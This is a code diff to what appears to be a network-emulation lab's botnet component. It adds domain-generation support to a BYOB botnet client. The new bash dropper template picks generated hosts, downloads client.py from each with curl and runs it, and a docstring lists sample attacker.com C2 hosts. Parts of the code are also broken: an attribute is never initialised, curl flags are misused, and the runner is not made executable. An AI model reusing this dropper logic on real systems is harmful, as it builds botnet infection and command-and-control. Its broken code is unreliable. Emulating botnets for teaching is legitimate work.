@@ -20,6 +20,21 @@ echo "botnet-client: server ready!"
 python3 client.py &
 '''
 
+BotnetServerFileTemplates['client_dropper_runner_dga'] = '''\
+#!/bin/bash
+chmod +x /dga
+while true; do {
+    host="`/dga | shuf -n1`"
+    echo "botnet-client: dga: trying $host..."
+    url="http://$host/clients/droppers/client.py"
+    curl -sHf "$url" -o client.py && {
+        echo "botnet-client: dga: $host works!"
+        python3 client.py
+    }
+    sleep 1
+}
+'''
+
 BotnetServerFileTemplates['server_init_script'] = '''\
 #!/bin/bash
 cd /tmp/byob/byob
@@ -136,6 +151,7 @@ class BotnetClientServer(Server):
 
     __server: str
     __port: int
+    __dga: str
 
     def __init__(self):
         """!
@@ -144,6 +160,7 @@ class BotnetClientServer(Server):
         super().__init__()
         self.__server = None
         self.__port = 446
+        self.__dga
 
     def setServer(self, server: str, port: int = 446) -> BotnetClientServer:
         """!
@@ -162,8 +179,34 @@ class BotnetClientServer(Server):
 
         return self
 
+    def setDga(self, dgaScript: str) -> BotnetClientServer:
+        """!
+        @brief set script for generating domain names. 
+
+        The script will be executed to get a "server:port" list, one server each
+        line. The script can be anything - bash, python, perl (may need
+        addSoftware('perl')), etc. The script should have the correct shebang
+        interpreter directive at the beginning.
+
+        Example output:
+
+        abcd.attacker.com:446
+        1234.attacker.com:446
+        zzzz.attacker.com:446
+
+        If DGA is used, server configured in setServer will be ignored. To
+        disable DGA, do setDga(None).
+
+        @param dgaScript content of DGA script, or None to disable DGA.
+
+        @returns self, for chaining API calls.
+        """
+        self.__dga = dgaScript
+
+        return self
+
     def install(self, node: Node):
-        assert self.__server != None, 'botnet-client on as{}/{} has no server configured!'.format(node.getAsn(), node.getName())
+        assert self.__server != None or self.__dga != None, 'botnet-client on as{}/{} has no server configured!'.format(node.getAsn(), node.getName())
 
         # get byob dependencies.
         node.addSoftware('python3 git cmake python3-dev gcc g++ make python3-pip') 
@@ -171,8 +214,12 @@ class BotnetClientServer(Server):
         node.addBuildCommand('pip3 install -r /tmp/byob-requirements.txt')
 
         # script to get dropper from server.
-        node.setFile('/client_dropper_runner', BotnetServerFileTemplates['client_dropper_runner'])
-        node.appendStartCommand('chmod +x /client_dropper_runner')
+        if self.__dga == None:
+            node.setFile('/client_dropper_runner', BotnetServerFileTemplates['client_dropper_runner'])
+            node.appendStartCommand('chmod +x /client_dropper_runner')
+        else:
+            node.setFile('/dga', self.__dga)
+            node.setFile('/client_dropper_runner', BotnetServerFileTemplates['client_dropper_runner_dga'])
 
         # get and run dropper from server.
         node.appendStartCommand('/client_dropper_runner "{}" "{}"'.format(self.__server, self.__port))
